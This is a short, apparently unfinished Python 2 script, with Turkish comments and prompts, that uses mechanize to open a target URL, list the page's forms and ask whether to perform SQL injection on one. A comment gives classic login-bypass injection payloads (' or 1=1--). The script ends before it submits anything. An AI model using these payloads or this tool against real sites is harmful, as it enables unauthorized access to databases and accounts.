import mechanize
import sys

#injection kodu : ' or 1=1-- veya ' or 1=1 #


br = mechanize.Browser()

try:
	istek = br.open(sys.argv[1])
except:
	print "istek atilamadi...!"
	exit()
bilgi = istek.info()
print "\t\tInfo"
print "-" * 75
print bilgi
print "\t\tForms"
for forum in br.forms():
	print "[*]", forum

s = raw_input("injection yapim mi? -e, h-: ")
if s == "e":
	f = int(raw_input("form kac : "))
	kod = raw_input("injection kodu : ")
else:
	pass
